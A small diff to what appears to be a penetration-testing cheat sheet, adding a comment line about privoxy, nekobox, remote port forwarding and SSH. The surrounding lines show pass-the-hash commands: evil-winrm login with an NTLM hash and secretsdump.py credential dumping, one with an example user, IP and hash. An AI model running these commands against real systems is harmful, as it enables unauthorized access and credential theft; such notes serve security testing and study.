@@ -241,3 +241,6 @@ evil-winrm -i <ip_address> -u <username> -H <ntlm_hash>
 #secretsdump with pass the hash
 secretsdump.py <User>@<IP> -hashes <Hash>
 secretsdump.py moe@10.10.10.100 -hashes aad321b35b51404eeaad982b5b51404ee:b38ff50264b7458734d82c69794a4d8
+
+
+#privoxy + nekobox on windows then Port forwarding (Remote) + SSH connection to Linux
